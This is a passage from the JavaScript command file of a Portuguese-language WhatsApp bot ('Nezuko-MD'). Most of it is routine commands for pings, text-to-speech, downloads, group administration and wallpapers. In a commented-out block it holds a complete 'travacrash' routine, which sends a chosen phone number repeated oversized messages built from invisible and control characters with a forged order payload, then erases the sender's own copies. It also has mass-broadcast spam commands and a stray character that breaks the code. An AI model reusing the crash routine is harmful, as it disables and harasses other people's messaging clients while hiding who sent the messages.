     reply(`Agora vc não é mais adm do grupo.`)
     kicee = sender
await nezuko.groupParticipantsUpdate(from, [kicee], 'demote')
}
break

//======== FINAL DE CMD DE DONO=======\\


//==============PING=================\\
case 'speed':
case 'ping2':
    let timestamp = speed()
    let latensi = speed() - timestamp
    neww = performance.now()
    oldd = performance.now()
reply('𝑽𝑬𝑳𝑶𝑪𝑰𝑫𝑨𝑫𝑬: ' + `${latensi.toFixed(4)}` + '𝑴𝑺')
break

case 'ping3': case 'status': {
            	    
		    		
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `🏓𝗩𝗲𝗹𝗼𝗰𝗶𝗱𝗮𝗱𝗲 𝗱𝗲 𝗿𝗲𝘀𝗽𝗼𝘀𝘁𝗮 ${latensi.toFixed(4)}  _Segundos_\n\n\n⏰𝗧𝗲𝗺𝗽𝗼 𝗼𝗻𝗹𝗶𝗻𝗲 ${runtime(process.uptime())}`.trim()
                reply(respon)
            }
            
            break

case 'ping':
if(!SoDono) return reply(enviar.msg.donosmt)
timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
hora1 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
sendBtext(from, `
╭ ⋟ Rᴇsᴘᴏɴᴅɪ Eᴍ: 0.00${speedB} Sᴇɢᴜɴᴅᴏs
│ Aᴛɪᴠɪᴅᴀᴅᴇ : ${runtime(process.uptime())}
│
└━━━─「🌹」─━━━━
`, `© Cᴏᴘʏʀɪɢʜᴛ Bʏ Nᴇᴢᴜᴋᴏ-MD `, 
[{buttonId: `${prefix}ping`, buttonText: {displayText: `[🏓] Reiniciar [🏓]`}, type: 1},
{buttonId: `${prefix}criador`, buttonText: {displayText: `[🔱] Dono [🔱]`}, type: 1}], )
break

case 'speedtest': {
            reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) reply(stdout)
        if (stderr.trim()) reply(stderr)
            }
            }
            break

case 'sup':
sendBtext(from, `Olá ${pushname},
aqui está seu comando, clique no botão abaixo para falar com meu dono.
`, `月⃟亮 ☾٭ Lorde Bot MD`, 
[{buttonId: `${prefix}criador`, buttonText: {displayText: `☔ 𝐃𝐎𝐍𝐎 ☔`}, type: 1},
{buttonId: `${prefix}menu`, buttonText: {displayText: `🌹 𝐌𝐄𝐍𝐔 🌹`}, type: 1}], )
break
//==============FIM===================\\


//=====================================


case 'gtts':
if (args.length < 1) return reply(`Cade o texto?, digite algo Exemplo:\n${prefix}gtts PT Oi`) 
const gtts = require('./funções de cmd/funções/gtts')(args[0])
if (args.length < 2) return reply('Falta colocar o código do idioma!')
dtt = body.slice(8)
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
if(dtt.length > 4000) return reply('Para reduzir spam o máximo de letras permitidas são 4000!')
gtts.save(ranm, dtt, function() {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buffer = fs.readFileSync(rano)
nezuko.sendMessage(from, {audio: buffer, ptt:true}, {quoted: dnselo})
fs.unlinkSync(rano)
})
})
break

case 'gerarlink':  
case 'imgpralink':    
try {
if (isQuotedImage) {
reply(enviar.espere)
boij = isQuotedImage ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : m
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande uma imagem com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe 😔')
}
break

case 'videourl':
case 'videopralink':
try {
if ((isQuotedVideo) && args.length == 0) {
reply(enviar.espere)
boij = isQuotedVideo ? JSON.parse(JSON.stringify(m).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.videoMessage : m
owgi = await getFileBuffer(boij, 'video')
res = await upload(owgi)
reply(res)
} else {
reply(`Mande vídeo com a legenda ${prefix + command}`)
}
} catch {
reply('Ocorreu algum Error, desculpe 😔/ O limite do tamanho de vídeo que gero o link, é 30 segundos.')
}
break

//===============TRAVAS======================

/*

case 'travacrash':
try {
if(!SoDono) return reply("Quem é você?")
if(q && args[0] === "-fake") {
teks = ""
for (var i = 0; i < 10; i++) {
teks += "💤"
}
tekks = ""
for (var i = 0; i < 100; i++) {
tekks += "؅؀؁؂؃؄"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‍"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `❤‍🔥 𝐂𝐚𝐩𝐞𝐭𝐢𝐧𝐡𝐚 😈${tekkss}${tekks}`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await nezuko.sendMessage(from, fuck, {quoted:selocrash})
await nezuko.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return reply(`Cade o número?`)
let [result] = await nezuko.onWhatsApp(id)
if(!result) return reply(`Numero inexistente`)
teks = ""
for (var i = 0; i < 60000; i++) {
teks += "💤"
}
let buttons = [
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1},
{buttonId: `crashed</>`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `❤‍🔥 𝐂𝐚𝐩𝐞𝐭𝐢𝐧𝐡𝐚 😈`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await nezuko.sendMessage(result.jid, fuck, {quoted:selocrash})
await nezuko.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
await sleep(500)
}
nezuko.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
reply("Hmm deu erro")
}
break	

*/

//=====================================

case 'mediafire':
try {
if (!q) return reply(`Coloque um link`)
if (!isUrl(q) || !q.includes('mediafire.com')) return reply(`Link inválido!`)
mfdw = await mediafire(`${args[0]}`)
buttons02 = [
{"urlButton": {"displayText": `LINK DOWNLOAD`, "url": mfdw[0].link}}
]
if (mfdw[0].peso.split('MB')[0] >= 250)
{
buttonMessage02 = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 ✅`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

Nome: ${mfdw[0].nome}
Peso: ${mfdw[0].peso}
Tipo: ${mfdw[0].tipo}`,
footer: `Arquivo muito pesado para ser enviado pelo WhatsApp.`,
templateButtons: buttons02,
headerType: 4,
}
nezuko.sendMessage(from, buttonMessage02)
} else {
buttonMessage02 = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: `application/pdf`,
mentions: [sender],
fileName: `𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿 ✅`,
fileLength: 665999000000,
caption: `*Mediafire Downloader*

Nome: ${mfdw[0].nome}
Peso: ${mfdw[0].peso}
Tipo: ${mfdw[0].tipo}`,
footer: `Aguarde, estou enviando...`,
templateButtons: buttons02,
headerType: 4,
}
nezuko.sendMessage(from, buttonMessage02)
await sleep(1000)
nezuko.sendMessage(from, {document: {url: mfdw[0].link}, fileName: mfdw[0].nome, mimetype: mfdw[0].tipo, mentions: [sender]}, {quoted: info})
}
} catch (err) {
console.log(err)
reply("Ocorreu um erro.")
}
break

case 'mediafire2':
txt = args.join(" ")
if(!txt) return reply('Cade o Link?')
bla = await fetchJson(`https://nezsab-apis.xyz/api/mediafire?url=${txt}&apikey=${keyapi}`)
reply(`*ꪶ͢͜🎗️𝐌𝐄𝐃𝐈𝐀𝐅𝐈𝐑𝐄² 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃🎗️ꫂ*\n๖ۣ• *Arquivo:* ${bla.resultado.nama}\n๖ۣ• *Tamanho:* ${bla.resultado.size}`)
blabla = await getBuffer(bla.resultado.link)
nezuko.sendMessage(from, {document: blabla, fileName: `${bla.resultado.nama}`, mimetype: bla.resultado.mime}, {quoted: dnselo})
break

case 'covidst':
teks = args.join(' ')
if (!q) return reply(`Use apenas a sigla do estado e, apenas uma sigla por consulta.`)
anu = await fetchJson(`https://www.luc4rio-rest-api.tk/api/consultas/covid/brasil?estado=${q}`)
covid1 = `🌐 *COVID-19 NO ESTADO:* ${anu.Sigla_Do_Estado}
➩ Sigla do estado: ${anu.Sigla_Do_Estado}
➩ Estado: ${anu.Estado_Informado}
➩ Casos desconhecidos: ${anu.Casos_Desconhecidos}
➩ Casos encontrados: ${anu.Casos_Encontrados}
➩ Mortes encontradas: ${anu.Mortes_Encontradas}
➩ Previsões Econtradas: ${anu.Previsoes_Encontradas}`
nezuko.sendMessage(from, {text: covid1}, {quoted: info})
break

case 'covidbr':
teks = args.join(' ')
covidnb = await fetchJson(`https://coronavirus-19-api.herokuapp.com/countries/brazil`)
anu = `🇧🇷 *COVID-19 NO BRASIL:*
➩ Casos no Brasil: ${covidnb.cases}
➩ Casos hoje: ${covidnb.todayCases}
➩️ Total de Mortes: ${covidnb.deaths}
➩️ Mortes hoje: ${covidnb.todayDeaths}
➩ Recuperados: ${covidnb.recovered}
➩ Casos ativos: ${covidnb.active}
➩ Casos criticos: ${covidnb.critical}
➩ Testes totais: ${covidnb.totalTests}`
nezuko.sendMessage(from, {text: anu}, {quoted: info})
break

case 'tm': case 'transmitir': case 'bcgroup': case 'bcgp':
if(!SoDono && !isCmd && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!q) return reply( `Texto onde?\n\nExemplo : ${prefix + command} Nᴇᴢᴜᴋᴏ Dᴏᴍɪɴᴀ`)
let getTm = await nezuko.groupFetchAllParticipating()
let groupps = Object.entries(getTm).slice(0).map(entry => entry[1])
let getMaper = groupps.map(v => v.id)
for (let i of getMaper) {
await sleep(1500)
 let avitm = `「 Tʀᴀɴsᴍɪssᴀ̃ᴏ Dᴀ Nᴇᴢᴜᴋᴏ 」\n\n\n` + q + `\n\n\n「 Tᴍ Nᴇᴢᴜᴋᴏ 」`
nezuko.sendMessage(i, {text: avitm, footer: NomeDoBot, buttons: [{buttonId: `${prefix}avaliar`, buttonText: {displayText: '⭐ Aᴠᴀʟɪᴀʀ'}, type: 1}, {buttonId: `${prefix}ping2`, buttonText: {displayText: '🏓 Pɪɴɢ'}, type: 1}, {buttonId: `${prefix}menulist`, buttonText: {displayText: '📋 ᴍᴇɴᴜ Lɪsᴛᴀ'}, type: 1}]}, {quoted: dnselo})
}
reply(`Transmissão enviada com sucesso para ${getMaper.length} chats.`, "✅")
break

case'bcpv':// by Nezuko-MD 
case 'bcgc':// by Nezuko-MD 
case 'tmpv':// by Nezuko-MD 
if (!SoDono  && !isnit && !issupre && !ischyt && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('.......')
fgp = await groupMembers
var nomor = info.participant
if (isMedia && !info.message.videoMessage || isQuotedImage) {
encmedia = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
for (let _ of fgp) {
nezuko.sendMessage(_.id, {image: buff}, {caption: `*「 Tʀᴀɴsᴍɪssᴀ̃ᴏ 」*\n\nGrupo: ${groupName}\n Número: wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`})
}
reply('')
} else {
for (let _ of fgp) {
sendMess(_.id, `*「 Tʀᴀɴsᴍɪssᴀ̃ᴏ 」*\n\nGrupo : ${groupName}\n Número : wa.me/${(sender.split('@')[0])}\nMensagem : ${body.slice(6)}`)
}
reply('<❗> Transmissão enviada com sucesso.')
} 
break

case 'rgtm':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("<❗> Apenas meu mestre pode executar esse comando.")
rgp = JSON.parse(fs.readFileSync("./func/TMGP.json"))
if(JSON.stringify(rgp).includes(from)) return reply("Este grupo ja está registrado na lista de transmissão") 
rgp.push(from)
fs.writeFileSync("./func/TMGP.json", JSON.stringify(rgp))
reply("Grupo registrado com sucesso, quando for realizada as transmissões, esse grupo estará na lista.")
break

case 'tirardatm':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("<❗> Apenas meu mestre pode executar esse comando.")
rgp = JSON.parse(fs.readFileSync("./func/TMGP.json"))
if(!JSON.stringify(rgp).includes(from)) return reply("Este grupo não está registrado para ser tirado da lista de transmissão") 
var ustm = rgp.indexOf(from)
rgp.splice(ustm, 1)
fs.writeFileSync("./func/TMGP.json", JSON.stringify(rgp))
reply("Grupo tirado da lista de transmissão com sucesso")
break

case 'fazertm':
if (!isGroup) return reply(enviar.msg.grupo)
if(!SoDono) return reply("<❗> Apenas meu mestre pode executar esse comando.")
rgp = JSON.parse(fs.readFileSync("./func/TMGP.json"))
if(rgp.lengh == 0) return reply("Não contém nenhum grupo registrado para realizar transmissão") 
reply("Transmissão enviada com sucesso") 
for (i = 0; i < rgp.length; i++) {
await sleep(1000)
nezuko.sendMessage(rgp[i], {text: q}) 
}
break

case 'recrutargp':
if(!SoDono) return reply(enviar.msg.donosmt)
var [sla, sla2] = q.split("/")
rcrt = sla.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
nezuko.sendMessage(from, {image:{url: logo}, mimetype: "image/jpeg", caption: "Clique no símbolo a cima da imagem para entrar no grupo...", contextInfo: {
externalAdReply: {
title:"- Clique aqui para participar do grupo",
body: "",
reviewType: "PHOTO", 
thumbnailUrl: logo, 
sourceUrl: sla2, 
mediaType: 2
},
mentions: groupMembers.map(i => i.id)
}})
break

case 'recrutar':
if(!isGroupAdmins && !isPremium) return reply("Só ADM ou premium")
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
rcrt = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
linkgc = await nezuko.groupInviteCode(from)
nezuko.sendMessage(rcrt, {image:{url: logo}, mimetype: "image/jpeg", caption: "Clique no símbolo a cima da imagem para entrar no grupo...", contextInfo: {
externalAdReply: {
title:"- Clique aqui para participar do grupo",
body: "",
reviewType: "PHOTO", 
thumbnailUrl: logo, 
sourceUrl: `https://chat.whatsapp.com/`+linkgc, 
mediaType: 2
}}})
reply("Convite de recrutamento do usuário, foi enviado para o privado dele com sucesso.")
break

case 'gitclone':// by Nezuko-MD 
reply('loading...')
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!args[0]) reply(`Use ${prefix}gitclone repo link\nExemplo: https://github.com/NuevaGeneracionALB/aleatory-md`)
if (!regex1.test(args[0])) return reply('Aguarde')
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
nezuko.sendMessage(from, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: selo }).catch((err) => reply('ERROR!!'))
break

            case 'gitdobot2':
                wew = fs.readFileSync('./funções de cmd/mídia-ft-vd/fotos/nezuko.jpg')

                nezuko.sendMessage(m.chat, { image: wew, caption: `No Momento só comprando com meu dono https://wa.me/5521964523665` }, { quoted: dnselo })

                break

//=============================
case 'abrirgp': case 'fechargp':
if (!isGroup) return reply(`Só em grupo`)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args[0] === 'a') {
reply(`*GRUPO ABERTO COM SUCESSO*`)
await nezuko.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'f') {
reply(`*GRUPO FECHADO COM SUCESSO*`)
await nezuko.groupSettingUpdate(from, 'announcement')
} else {
buttons02 = [
{buttonId: `${prefix + command} a`, buttonText: {displayText: 'Abrir'}, type: 1},
{buttonId: `${prefix + command} f`, buttonText: {displayText: 'Fechar'}, type: 1},
]
buttonMessage02 = {
text: `╭━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ⚡️❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╮
         𝐀𝐁𝐑𝐈𝐑/𝐅𝐄𝐂𝐇𝐀𝐑 𝐆𝐑𝐔𝐏𝐎
╰━━━━━•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ⚡️❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•━━━━━╯`,
footer: `Aperte no botão abaixo para abrir ou fechar o grupo.\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
nezuko.sendMessage(from, buttonMessage02, {quoted: dnselo})
}
break 

case 'grupoinfo':
case 'infogrupo':
case 'infogp':  
case 'gpinfo':  
case 'regras':  
if (!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins)return reply(enviar.msg.adm)
ppUrl = await nezuko.profilePictureUrl(from, 'image')
buffer = await getBuffer(ppUrl)
const metadatqa = await nezuko.groupMetadata(from) 
nezuko.sendMessage(from, {image: buffer, caption: `*NOME* : ${groupName}\n*MEMBROS* : ${groupMembers.length}\n*ADMINS* : ${groupAdmins.length}\n*DESCRIÇÃO* : ${metadatqa.desc}`, thumbnail: null}, {quoted: info})
break 


case 'novolink':
case 'redefinir':
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
try {
await nezuko.groupRevokeInvite(from)
reply('<❗> Link do grupo redefinido com sucesso!')
} catch(e) {
console.log(e)
enviar(`ERRO`)
}
break

case 'linkgp': {

addFilter(from)  

if (!m.isGroup) return reply(mess.group)

if (!isBotAdmins) return reply(mess.only.botadm)

try {

pic = await nezuko.profilePictureUrl(m.chat, "image")

} catch(e) {

pic = 'https://telegra.ph/file/d61d4c82512ea3fb9588c.jpg'

}

ds = await getBuffer(pic)

let buttons = [

{buttonId: `${prefix}linkgc`, buttonText: {displayText: '👥 Link do grupo'}, type: 1},

{buttonId: `${prefix}linkgppv`, buttonText: {displayText: '⚙️ Link do grupo no pv'}, type: 1},

{buttonId: `${prefix}redefinir`, buttonText: {displayText: '❗ Redefinir o link'}, type: 1}]

let thumbInfo = `aqui está!\n_Escolha uma das opções abaixo._`;

buttonMessage = {image: ds, caption: `${thumbInfo}`, footer: `© _Copyright by Nezuko-MD_`, buttons: buttons, headerType: 4}

nezuko.sendMessage(m.chat, buttonMessage, {quoted: dnselo})

}

break


case 'modos': {

addFilter(from)  

if (!m.isGroup) return reply(mess.group)

if (!isBotAdmins) return reply(mess.only.botadm)

try {

pic = await nezuko.profilePictureUrl(m.chat, "image")

} catch(e) {

pic = 'https://telegra.ph/file/d61d4c82512ea3fb9588c.jpg'

}

ds = await getBuffer(pic)

let buttons = [

{buttonId: `${prefix}privado`, buttonText: {displayText: '🌹 Bangp'}, type: 1},

{buttonId: `${prefix}publico`, buttonText: {displayText: '🌹 Unbangp'}, type: 1},

{buttonId: `${prefix}contratar`, buttonText: {displayText: '🔰 Criador'}, type: 1}]

let thumbInfo = `Aqui está Mestre!`;

buttonMessage = {image: ds, caption: `${thumbInfo}`, footer: `© _Copyright by Nezuko-MD_`, buttons: buttons, headerType: 4}

nezuko.sendMessage(m.chat, buttonMessage, {quoted: dnselo})

}

break

case 'privado':
case 'muteallon':
if (!SoDono) return m.reply(`<❗> Somente meu dono pode usar esse comando.`)
if (banChatss) return await m.reply('O modo privado já está ativo.')
banChatss = true
nescessario.banChatss = banChatss
fs.writeFileSync('./funções de cmd/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await nezuko.sendMessage(from, {text: "Mudança bem-sucedida para uso privado - apenas meu dono pode me usar."})
break

case 'publico':
case 'mutealloff':
if (!SoDono) return m.reply(`<❗> Somente meu dono pode usar esse comando.`)
if (!banChatss) return await m.reply('Não está ativado ainda.')
banChatss = false
nescessario.banChatss = banChatss
fs.writeFileSync('./funções de cmd/nescessario.json', JSON.stringify(nescessario, null, '\t'))
await nezuko.sendMessage(from, {text: "Mudança bem-sucedida para o uso público - todos podem usar meus comandos.*"})
break

case 'linkgppv':
            case 'linkgrupopv':
            reply(`<❗> Enviando link no seu pv, aguarde. `)
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isGroupAdmins) return reply(enviar.msg.adm)
                if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
                linkgc = await nezuko.groupInviteCode(from)
nezuko.sendMessage(sender, { text: 'https://chat.whatsapp.com/' + linkgc}, {quoted: dnselo})    
 break

//======================================\\

case 'wallpapers4k': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpapers4k.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapers4k`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperdark': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperdark.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdark`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperanimes': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperanimes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperanimes`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperbranco': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpapersbranco.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapersbranco`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break
l
case 'wallpapervermelho': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpapervermelho.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapervermelho`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperverde': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperverde.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperverde`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperazul': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperazul.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperazul`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperroxo': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperoxo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui está o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperoxo`, buttonText: {displayText: '☔ 𝐏𝐑𝐎́𝐗𝐈𝐌𝐎 ☔'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `© Copyright By Nezuko-MD`
, buttons: buttons, headerType: 4}
nezuko.sendMessage(m.chat, buttonMessage,{quoted: dnselo})
}
break

case 'wallpaperamarelo': {
//by Daniel >\<
data = fs.readFileSync('./funções de cmd/imgs/wallpapers/wallpaperamarelo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
